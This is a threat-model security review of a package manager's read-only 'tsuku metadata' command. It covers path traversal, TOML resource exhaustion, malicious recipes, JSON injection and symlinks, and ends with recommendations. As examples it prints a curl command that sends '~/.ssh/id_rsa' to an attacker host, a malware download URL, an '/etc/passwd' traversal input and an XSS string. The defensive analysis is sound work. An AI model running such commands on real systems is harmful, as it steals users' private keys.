# Phase 8: Security Review

## Threat Model Assessment

### Trust Boundaries

The `tsuku metadata` command operates within the following trust boundaries:

1. **User Input Boundary**: Accepts tool name or `--recipe` file path from user
2. **Filesystem Boundary**: Reads TOML files from:
   - User-specified paths (via `--recipe` flag)
   - Local recipes directory (`$TSUKU_HOME/recipes`)
   - Embedded recipes (bundled in binary)
   - Cached registry (`$TSUKU_HOME/registry`)
3. **Parser Boundary**: TOML parsing via `github.com/BurntSushi/toml` v1.5.0
4. **Output Boundary**: JSON/human-readable text to stdout

### Attack Surface

**Inputs:**
- Command-line tool name (validated against recipe existence)
- `--recipe` file path (arbitrary user-controlled filesystem path)
- Recipe TOML file contents (untrusted when using `--recipe`)

**Processing:**
- TOML parsing (dependency on third-party library)
- Platform constraint computation (`GetSupportedPlatforms()`)
- Struct marshaling to JSON

**Outputs:**
- JSON metadata to stdout
- Human-readable metadata to stdout
- Error messages to stderr

**No Network Access**: Command is fully offline
**No Code Execution**: Command does not execute binaries, shell commands, or dynamic code
**No Writes**: Command is read-only (no filesystem modifications)

## Attack Vector Analysis

### 1. Path Traversal via `--recipe` Flag

**Attack**: User provides `--recipe ../../../../etc/passwd` or other sensitive system files.

**Risk Level**: LOW

**Analysis**:
- The command calls `recipe.ParseFile(path)` which reads the file via `os.ReadFile()`
- If the file exists and is readable by the user, it will be read
- However, the TOML parser will fail on non-TOML files (e.g., `/etc/passwd`)
- Failure mode: Graceful error with parse failure message
- Information disclosure: Error messages may reveal file existence, but not contents

**Actual Behavior**:
```go
// From loader.go:366-374
func ParseFile(path string) (*Recipe, error) {
	data, err := os.ReadFile(path)  // Reads any user-accessible file
	if err != nil {
		return nil, fmt.Errorf("failed to read file: %w", err)
	}

	var r Recipe
	if err := toml.Unmarshal(data, &r); err != nil {  // Will fail on non-TOML
		return nil, fmt.Errorf("failed to parse TOML: %w", err)
	}
```

**Mitigations**:
- OS-level file permissions prevent reading files the user cannot access
- TOML parser rejects non-TOML content (no arbitrary file content disclosure)
- No path sanitization needed because:
  1. Command doesn't write files (so no directory traversal writes)
  2. OS handles path resolution securely
  3. Parser validates content before output

**Residual Risk**: User can discover if a file exists and is readable by observing error differences ("file not found" vs "parse error"). This is acceptable as it only reveals what the user could already discover via `test -r <path>`.

### 2. TOML Bomb (Resource Exhaustion)

**Attack**: Malicious recipe file with deeply nested structures or extremely large arrays to cause parser to consume excessive memory or CPU.

**Risk Level**: LOW-MEDIUM

**Analysis**:
- Parser: `github.com/BurntSushi/toml` v1.5.0 (well-established library)
- TOML spec has inherent limits (no recursive references like YAML anchors)
- Go's `toml.Unmarshal()` operates on in-memory byte slice (already bounded by file size)
- No known algorithmic complexity vulnerabilities in BurntSushi/toml

**Potential Attack Vectors**:
1. **Large arrays**: `binaries = ["a", "b", "c", ... (millions)]`
2. **Deep nesting**: `[[steps.params.nested.nested.nested...]]`
3. **Large strings**: Very long description or URL fields

**Mitigations**:
- File size implicitly limited by `os.ReadFile()` (bounded by available memory)
- TOML parser has reasonable complexity bounds (linear in file size)
- Go runtime will terminate process if OOM occurs (no unbounded memory growth)
- No eval or expansion of content (just parsing and struct unmarshaling)

**Missing Mitigations**:
- No explicit file size check before parsing
- No timeout on parse operation
- No memory limit specific to this command

**Residual Risk**: A malicious user could create a multi-GB TOML file that consumes significant memory during parsing. However:
- Attack requires local file creation (user already has system access)
- Worst case: Process OOM, user's tsuku command crashes (no system impact)
- No amplification attack (output size ≤ input size after JSON marshaling)

### 3. Malicious Metadata in Recipe Files

**Attack**: Recipe file contains misleading metadata (false platform support, incorrect dependencies, malicious URLs in comments).

**Risk Level**: MEDIUM (for automation), LOW (for manual use)

**Analysis**:
- Command faithfully outputs whatever is in the recipe TOML
- No validation that metadata is "truthful" (by design - this is static introspection)
- Automation relying on metadata could make incorrect decisions

**Example Malicious Recipe**:
```toml
[metadata]
name = "backdoor-tool"
description = "Secure file encryption tool"  # Lies
supported_os = ["linux", "darwin"]  # Claims universal support

[[steps]]
action = "download"
url = "https://malicious.example.com/malware.tar.gz"  # Malicious URL
# Note: metadata command doesn't download, just outputs this URL
```

**Scenario**: CI pipeline queries `tsuku metadata backdoor-tool` to get platform support, then generates installation plans for all platforms listed. The pipeline trusts the metadata output.

**Impact**:
- Automation builds plans for wrong platforms
- Automation trusts malicious URLs without verification
- However: Actual exploitation requires subsequent `tsuku install` (out of scope)

**Mitigations**:
- Command is read-only (doesn't execute steps or download URLs)
- Users must explicitly install the tool for actual compromise
- Recipe review processes (in automation) should verify recipe contents
- The `--recipe` flag is primarily for testing local/uncommitted recipes that users control

**Residual Risk**:
- Automation consuming metadata output must validate recipe source trustworthiness
- This is equivalent to the risk of running `cat recipe.toml | jq` - if you don't trust the recipe file, don't parse it
- Acceptable because metadata command is intended for recipe testing workflows where user controls the recipe file

### 4. JSON Injection in Output

**Attack**: Recipe fields contain special characters that break JSON parsing or inject malicious content into JSON consumers.

**Risk Level**: LOW

**Analysis**:
- Output generation uses Go's `encoding/json` package
- Standard library properly escapes strings, handles special characters
- No raw string concatenation into JSON output

**Example Test Case**:
```toml
[metadata]
name = "test\"; alert('xss'); //"
description = "Line1\nLine2\tTab"
homepage = "http://example.com?param=value&other=<script>"
```

**Expected Behavior**: Go's JSON marshaler will properly escape:
- Quotes: `\"`
- Newlines: `\n`
- Tabs: `\t`
- HTML: `<`, `>`, `&` (automatically escaped in JSON strings)

**Verification**: Go's `json.Marshal()` is designed to produce safe JSON regardless of input.

**Mitigations**:
- Using standard library JSON marshaling (not manual string building)
- No use of `json.RawMessage` or unescaped raw strings

**Residual Risk**: None - this is handled correctly by design.

### 5. Information Disclosure via Error Messages

**Attack**: Craft inputs to reveal information about system paths, recipe structure, or internal implementation via error messages.

**Risk Level**: LOW

**Analysis**:

**Error Message Examples**:
- `"failed to read file: open /etc/passwd: permission denied"` - Reveals file existence
- `"failed to parse TOML: line 5: expected '=' but got ']'"` - Reveals file is readable but invalid
- `"recipe 'nonexistent' not found"` - Confirms recipe doesn't exist in registry

**Information Revealed**:
- File system paths (only those user can already access)
- Recipe existence in registry (public information via `tsuku recipes`)
- TOML syntax errors (useful for recipe development)

**Sensitive Information NOT Revealed**:
- Contents of non-recipe files (parser rejects them)
- Private keys, credentials, or secrets
- Internal tsuku implementation details
- Other users' files (OS permissions enforced)

**Mitigations**:
- Error messages are intentionally informative for debugging
- No leakage of sensitive data (command doesn't access sensitive data)
- Path disclosure only for user-accessible files

**Residual Risk**: Minimal - error verbosity helps legitimate users debug recipe issues.

### 6. Dependency Confusion via Recipe Name

**Attack**: User queries metadata for tool name that shadows a legitimate recipe via local recipes directory.

**Risk Level**: LOW (by design)

**Analysis**:
- Recipe resolution priority: in-memory cache → local recipes → embedded → registry
- If user has `~/.tsuku/recipes/kubectl.toml`, it shadows registry `kubectl`
- The loader warns when shadowing occurs (see `warnIfShadows()` in loader.go)

**Scenario**:
1. Attacker convinces user to place malicious recipe in `~/.tsuku/recipes/`
2. User runs `tsuku metadata kubectl` expecting registry version
3. Command outputs malicious local recipe metadata (with warning)

**Mitigations**:
- Warning message: `"Warning: local recipe 'kubectl' shadows registry recipe"`
- User must manually place file in local recipes directory (requires local access)
- If attacker has local filesystem write access, they can already compromise the system

**Residual Risk**: Acceptable - local recipes are intended for development/override scenarios, and warnings alert users to shadowing.

### 7. Platform Computation Errors

**Attack**: Malformed platform constraints in recipe cause `GetSupportedPlatforms()` to panic or return incorrect results.

**Risk Level**: LOW

**Analysis**:
- `GetSupportedPlatforms()` implementation (platform.go:196-220):
  - Uses simple Cartesian product logic
  - No recursion or complex algorithms
  - Handles nil slices (defaults to tsuku-supported platforms)
  - Filters out denylisted platforms

**Edge Cases**:
1. Empty arrays: `supported_os = []` → Cartesian product is empty → returns `[]`
2. Invalid platform format: `unsupported_platforms = ["invalid"]` → Filtered correctly
3. Nil vs empty: `nil` defaults to all tsuku platforms, `[]` is explicit empty set

**Validation**: `ValidatePlatformConstraints()` checks for:
- Empty result set (error)
- No-op exclusions (warning)

**Potential Issue**: If recipe has `supported_os = []`, `GetSupportedPlatforms()` returns empty array, and metadata output shows `"supported_platforms": []`. This is correct but might surprise users who expect an error.

**Mitigations**:
- Validation is run during recipe parsing (loader.go:169-171 calls `validate()`)
- Empty platform set would be caught during recipe loading if validation is strict

**Residual Risk**: Minimal - platform computation is deterministic and well-tested (platform_test.go).

### 8. Command Injection via Verification Fields

**Attack**: Recipe contains malicious shell commands in `verify.command` field that get executed when metadata is displayed.

**Risk Level**: NONE

**Analysis**:
- Metadata command does NOT execute verification commands
- It only outputs the static string value from the TOML
- Verification execution happens in `tsuku verify` or post-install, not in `tsuku metadata`

**Example**:
```toml
[verify]
command = "curl http://attacker.com/exfiltrate?data=$(cat ~/.ssh/id_rsa)"
```

**Metadata Output**:
```json
{
  "verification": {
    "command": "curl http://attacker.com/exfiltrate?data=$(cat ~/.ssh/id_rsa)"
  }
}
```

**Impact**: String is output but never executed. Command injection is impossible.

**Residual Risk**: None for metadata command. Verification command security is a concern for `tsuku verify` and `tsuku install`, not this command.

### 9. Symlink Attacks

**Attack**: `--recipe` flag points to a symlink that resolves to a sensitive file or changes during command execution.

**Risk Level**: LOW

**Analysis**:
- `os.ReadFile()` follows symlinks by default (Go standard behavior)
- TOCTOU (Time-of-Check-Time-of-Use) race: Symlink could change between path resolution and file read
- However, impact is limited:
  - File must be user-readable (OS permissions enforced)
  - File must be valid TOML (parser rejects non-TOML)
  - No writes, so no symlink-based privilege escalation

**Scenario**:
1. Attacker creates `/tmp/recipe.toml` symlink to `/etc/passwd`
2. User runs `tsuku metadata --recipe /tmp/recipe.toml`
3. Command attempts to parse `/etc/passwd` as TOML, fails gracefully

**Mitigations**:
- TOML parser validates content
- Read-only operation (no security-sensitive writes)
- OS permissions prevent unauthorized file access

**Residual Risk**: Minimal - worst case is confusion from unexpected parse errors.

### 10. Denial of Service via Parallel Queries

**Attack**: Automated system runs hundreds of `tsuku metadata` commands in parallel, exhausting system resources.

**Risk Level**: LOW

**Analysis**:
- Command is CPU/memory bound (TOML parsing + JSON marshaling)
- No global locks or shared state that would serialize execution
- Each invocation is independent process

**Resource Consumption per Invocation**:
- Memory: Recipe file size + parsed structs + JSON output (typically < 10 MB)
- CPU: Linear in file size for parsing
- I/O: Single file read operation

**Mitigations**:
- OS process limits prevent unbounded process creation
- No amplification (output size ≤ input size)
- Fast execution (typically milliseconds for normal recipes)

**Residual Risk**: If user has permission to fork-bomb their own system, `tsuku metadata` is no worse than any other command. Standard OS-level protections apply.

## Mitigation Sufficiency

### Current Mitigations - ADEQUATE

1. **TOML Parser Choice**: Using `github.com/BurntSushi/toml` v1.5.0
   - Well-maintained, widely-used library
   - No known security vulnerabilities
   - Handles edge cases (empty arrays, special characters) correctly

2. **Read-Only Operation**: No filesystem writes, no command execution
   - Eliminates entire classes of attacks (privilege escalation, persistence)
   - Worst-case impact: Process crash or incorrect output

3. **OS-Level Permissions**: Relying on `os.ReadFile()` permission checks
   - Appropriate for read-only operations
   - No need for additional path validation

4. **Standard Library JSON**: Using `encoding/json` for output
   - Proper escaping of special characters
   - No injection vulnerabilities

### Missing Mitigations - ACCEPTABLE

1. **No File Size Limit**: Could parse arbitrarily large files
   - **Acceptable**: User controls input file, worst case is OOM crash
   - **Alternative**: Could add explicit limit (e.g., 10 MB max recipe file)
   - **Recommendation**: Add if DoS becomes a practical concern

2. **No Parse Timeout**: TOML parsing could theoretically take long time
   - **Acceptable**: TOML parser complexity is linear, no pathological cases known
   - **Alternative**: Context-based timeout wrapper
   - **Recommendation**: Monitor in practice, add if needed

3. **No Explicit Path Sanitization**: `--recipe` accepts any path
   - **Acceptable**: OS handles path resolution securely, parser validates content
   - **Alternative**: Restrict to specific directories or validate path format
   - **Recommendation**: Not needed - OS permissions are sufficient

4. **No Recipe Source Verification**: Trusts local recipe files
   - **Acceptable**: This is intentional for recipe development workflow
   - **Alternative**: Add `--trust-local` flag for automation
   - **Recommendation**: Document that `--recipe` is for testing/development only

## Residual Risk Evaluation

### High Risk: NONE

No high-risk vulnerabilities identified.

### Medium Risk: Misleading Metadata in Automation

**Risk**: Automation pipelines consume `tsuku metadata` output without validating recipe trustworthiness.

**Scenario**: CI pipeline uses `tsuku metadata --recipe $UNTRUSTED_FILE` to generate build matrix, trusts the platform support claims.

**Impact**: CI builds for wrong platforms, wastes resources, potential confusion.

**Likelihood**: Low - recipe files are typically version-controlled and reviewed.

**Mitigation**:
- Document that metadata command outputs recipes "as-is" without validation
- Automation should verify recipe source (e.g., signed commits, PR reviews)
- Consider adding `--strict` flag that validates semantic constraints

**Acceptance**: Acceptable for first release - document that recipe validation is user's responsibility.

### Low Risk: Resource Exhaustion via Large TOML

**Risk**: User (or automation) provides multi-GB TOML file, causes OOM.

**Impact**: Command crashes, user must retry.

**Likelihood**: Very low - recipe files are typically < 10 KB.

**Mitigation**: Add file size check (e.g., 10 MB limit) in future if needed.

**Acceptance**: Acceptable - this is a local DoS, user has better ways to exhaust resources.

### Low Risk: Path Traversal Information Disclosure

**Risk**: Error messages reveal file existence for files outside recipe directories.

**Impact**: Attacker learns if arbitrary files exist and are readable.

**Likelihood**: Low - attacker needs to convince user to run specific commands.

**Mitigation**: Could suppress detailed error messages, but reduces debuggability.

**Acceptance**: Acceptable - equivalent to running `test -r $FILE`, information already accessible.

## "Not Applicable" Validation

### Download Verification - CORRECTLY NOT APPLICABLE

**Claim**: "The metadata command does not download any external artifacts."

**Validation**:
- Command code path: Argument parsing → Recipe loading → JSON marshaling → Output
- No network imports in `cmd/tsuku/metadata.go` design
- No calls to HTTP clients, downloaders, or external APIs
- Registry recipes are loaded from local cache (`$TSUKU_HOME/registry`)
- `eval.go` comparison: `eval` calls `executor.GeneratePlan()` which downloads; `metadata` does not

**Verdict**: ✅ CORRECT - No downloads occur

### User Data Exposure - CORRECTLY NOT APPLICABLE

**Claim**: "This command does not access or transmit user data."

**Validation**:
- Command reads: Recipe TOML files only
- Command does NOT read:
  - `$TSUKU_HOME/state.json` (installation state)
  - Installed binaries or user files
  - Environment variables beyond standard TSUKU_HOME
  - Shell history or user configs
- Command writes: Nothing (read-only)
- Command transmits: Nothing (no network)

**Verdict**: ✅ CORRECT - No user data access

### Execution Isolation - NEEDS REVISION

**Claim**: "Low risk - This is a read-only command with minimal permissions."

**Validation**: Claim is accurate but could be strengthened.

**Risks Actually Present**:
- Path traversal via `--recipe` (mitigated by OS permissions + TOML validation)
- TOML bomb resource exhaustion (low likelihood, acceptable impact)

**Suggested Revision**:
```markdown
**Low risk** - This is a read-only command with minimal attack surface:

**Mitigations**:
- Uses standard TOML parser (github.com/BurntSushi/toml) with built-in size limits
- Relies on OS-level file access controls (command can only read what user can read)
- No eval/exec of recipe contents - only static parsing
- Path traversal via --recipe is mitigated by TOML parser rejecting non-TOML files

**Residual risks**:
- TOML bomb: Maliciously large TOML could cause parser to consume excessive memory
  - Impact: Process OOM crash (no system-level impact)
  - Mitigation: Could add explicit file size limit (e.g., 10 MB) if needed
```

## Edge Case Threats

### 1. TOML Parser Exploits

**Threat**: Vulnerability in `github.com/BurntSushi/toml` library.

**Current State**: v1.5.0 (released 2024, no known CVEs)

**Monitoring**:
- Subscribe to GitHub security advisories for the repo
- Use `go list -m -u all` to check for updates
- Consider Dependabot or similar for automated updates

**Response Plan**: If CVE is published, update dependency and release patch version.

### 2. Unicode/Encoding Attacks

**Threat**: Recipe files with unusual encodings (UTF-16, BOMs, null bytes) cause parser confusion.

**Analysis**:
- Go's TOML parser expects UTF-8
- `os.ReadFile()` reads raw bytes
- TOML spec requires UTF-8 encoding

**Test Cases**:
- File with UTF-16 BOM: Parser will likely fail on invalid UTF-8
- File with null bytes: TOML parser will reject
- File with mixed encodings: Parser will fail or produce mojibake

**Impact**: Parse errors (graceful failure), not security vulnerability.

**Mitigation**: None needed - parser correctly rejects invalid encodings.

### 3. Recursive Symlinks

**Threat**: `--recipe` points to symlink that creates circular reference.

**Analysis**:
- `os.ReadFile()` follows symlinks but OS prevents infinite loops
- Linux: Returns `ELOOP` error after ~40 symlink traversals
- Impact: Error message, command exits

**Mitigation**: None needed - OS handles this correctly.

### 4. Concurrent Modification During Read

**Threat**: Recipe file is modified while being read (TOCTOU race).

**Analysis**:
- `os.ReadFile()` is atomic from user-space perspective
- File is read entirely into memory in single syscall
- Modification after read but before parse: Affects that execution only
- No state persistence or caching of `--recipe` files

**Impact**: Worst case - inconsistent metadata output for that invocation.

**Mitigation**: None needed - inherent limitation of filesystem reading.

### 5. Platform Computation Edge Cases

**Specific Edge Cases**:

**Case 1: Empty Platform Support**
```toml
[metadata]
supported_os = []
supported_arch = []
```
- `GetSupportedPlatforms()` returns `[]`
- Metadata output: `"supported_platforms": []`
- Should this be an error? Currently allowed.

**Case 2: Contradictory Constraints**
```toml
[metadata]
supported_os = ["linux"]
supported_arch = ["amd64"]
unsupported_platforms = ["linux/amd64"]  # Excludes only supported platform
```
- Validation catches this: `ValidatePlatformConstraints()` returns error
- Error: "platform constraints result in no supported platforms"

**Case 3: No-op Exclusions**
```toml
[metadata]
supported_os = ["linux"]
unsupported_platforms = ["darwin/arm64"]  # Not in supported set
```
- Validation warns: "unsupported_platforms contains 'darwin/arm64' which is not in supported set"
- Warning is informational, not blocking

**Recommendation**: Ensure `validate()` function called during `ParseFile()` is strict mode by default. Currently validation may be lenient for embedded recipes but should be strict for `--recipe` files.

### 6. Integer Overflow in Tier Field

**Threat**: Recipe specifies extremely large tier value.

```toml
[metadata]
tier = 9999999999999999999
```

**Analysis**:
- `tier` is declared as `int` in Go struct (types.go:156)
- TOML parser will unmarshal integer
- Go `int` is platform-dependent (32 or 64 bit)
- Overflow behavior: Parser may error or wrap

**Impact**:
- Worst case: Tier value is incorrect in metadata output
- No security impact (tier is informational metadata, not used for access control)

**Mitigation**: None needed - tier is non-security-critical metadata.

### 7. Malformed Version Source

**Threat**: Recipe has incomplete or contradictory version source configuration.

```toml
[version]
source = "github_releases"
# Missing required github_repo field
```

**Analysis**:
- Metadata command outputs version section as-is
- Version resolution would fail in `tsuku eval` or `tsuku install`
- Metadata command doesn't validate version source correctness

**Impact**: Metadata output contains incomplete version config, automation may fail later.

**Mitigation**: Not needed for metadata command - this is static introspection, not validation.

**Recommendation**: Document that metadata command does not validate semantic correctness of recipes.

## Recommendations

### Priority 1: Documentation (Critical for Security)

1. **Document Trust Model** in command help text and design doc:
   ```
   The metadata command outputs recipe contents as-is without validation.
   When using --recipe with untrusted files, verify the recipe source first.
   This command is intended for testing local recipes during development.
   ```

2. **Add Security Section to Design Doc**:
   - Clarify that metadata is static introspection, not validation
   - Warn about trusting metadata from untrusted recipes
   - Document that `--recipe` should only be used with user-controlled files

3. **Update "Execution Isolation" Section** with more detailed analysis (see "Not Applicable Validation" above).

### Priority 2: Validation Improvements (Recommended)

1. **File Size Limit**: Add maximum file size check (10 MB) to prevent accidental DoS:
   ```go
   func ParseFile(path string) (*Recipe, error) {
       stat, err := os.Stat(path)
       if err != nil {
           return nil, err
       }
       if stat.Size() > 10*1024*1024 {  // 10 MB
           return nil, fmt.Errorf("recipe file too large: %d bytes (max 10 MB)", stat.Size())
       }
       // ... rest of parsing
   }
   ```

2. **Strict Validation for --recipe**: Ensure `validate()` is called with strict mode:
   ```go
   // In metadata command:
   if recipePath != "" {
       r, err := recipe.ParseFile(recipePath)
       if err != nil {
           return err
       }
       // Validate platform constraints strictly for external files
       warnings, err := r.ValidatePlatformConstraints()
       if err != nil {
           return fmt.Errorf("invalid platform constraints: %w", err)
       }
       // Optionally surface warnings in verbose mode
   }
   ```

### Priority 3: Future Enhancements (Optional)

1. **Add --strict Flag**: Optional semantic validation of recipe contents:
   - Validate version source has required fields
   - Check that URLs are well-formed (not fetched, just validated)
   - Verify binary names don't contain path traversal

2. **Add --trust Flag for Automation**: Require explicit trust for untrusted recipes:
   ```bash
   # Fails with error for files outside $TSUKU_HOME/recipes
   tsuku metadata --recipe /tmp/untrusted.toml

   # Succeeds with explicit trust
   tsuku metadata --recipe /tmp/untrusted.toml --trust
   ```

3. **Parse Timeout**: Add context-based timeout (e.g., 30 seconds) for pathological cases:
   ```go
   ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
   defer cancel()
   // Use ctx in parsing logic
   ```

### Priority 4: Testing (Recommended)

1. **Add Security Test Cases**:
   - Path traversal: `--recipe ../../../../etc/passwd`
   - Large file: Multi-MB TOML file
   - Malformed TOML: Invalid UTF-8, null bytes, deeply nested
   - Empty platforms: `supported_os = []`
   - Special characters in metadata: Quotes, newlines, HTML tags

2. **Fuzzing**: Consider go-fuzz for TOML parser integration:
   ```bash
   go-fuzz-build github.com/tsukumogami/tsuku/internal/recipe
   go-fuzz -bin=./recipe-fuzz.zip -workdir=testdata/fuzz
   ```

## Summary

The `tsuku metadata` command has **low security risk** due to its read-only, offline nature. The security analysis reveals:

✅ **No Critical Vulnerabilities**: Command cannot be used for privilege escalation, data exfiltration, or remote code execution.

✅ **Well-Mitigated**: Current mitigations (TOML parser choice, OS permissions, read-only design) are appropriate for the threat model.

⚠️ **One Medium Risk**: Automation trusting metadata from untrusted recipes could make incorrect decisions. **Mitigation**: Document trust model clearly.

🔧 **Recommended Improvements**:
1. Add documentation about trust model (critical)
2. Add 10 MB file size limit (defense in depth)
3. Ensure strict validation for `--recipe` files (prevent confusion)

The design doc's "Not Applicable" claims are **mostly correct** with one suggestion to expand the "Execution Isolation" section with more detail.

**Approval Recommendation**: Security posture is acceptable for initial release with documentation improvements. Optional: Add file size limit for defense in depth.
